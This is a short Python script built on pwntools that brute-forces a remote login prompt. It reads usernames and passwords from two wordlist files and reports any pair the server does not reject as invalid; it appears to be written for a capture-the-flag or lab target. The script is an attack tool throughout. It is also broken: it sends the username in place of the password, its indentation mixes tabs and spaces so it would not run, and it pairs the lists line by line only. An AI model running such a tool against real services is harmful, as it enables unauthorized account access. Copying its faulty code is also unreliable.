from pwn import *

HOST = sys.argv[1]
PORT = sys.argv[2]

USERNAME = 'username.txt'
PASSWORD = 'password.txt'

context.log_level = 'error'

def bruteforce_continuous():
    r = remote(HOST, PORT)
    
    with open(USERNAME, 'r', encoding='latin-1') as f1, open(PASSWORD, 'r', encoding='latin-1') as f2:
        for line1, line2 in zip(f1, f2):
            username = line1.strip()
	        password = line2.strip()
            
            try:
		        r.recvuntil(b"Username: ")
		        r.sendline(username.encode())
                r.recvuntil(b"Password: ") 
                r.sendline(username.encode())
                response = r.recvline(timeout=2).decode('latin-1')
                if "Invalid" not in response:
                            print(f"[+] FOUND MATCH! Username : {username} and Password: {password}")
                            print(f"[+] Response: {response}")
                            break

                        print(f"[-] Failed: {password}")
                
            except EOFError:
                print("[!] Server closed the connection unexpectedly.")
                break

    r.close()

if __name__ == '__main__':
    bruteforce_continuous()
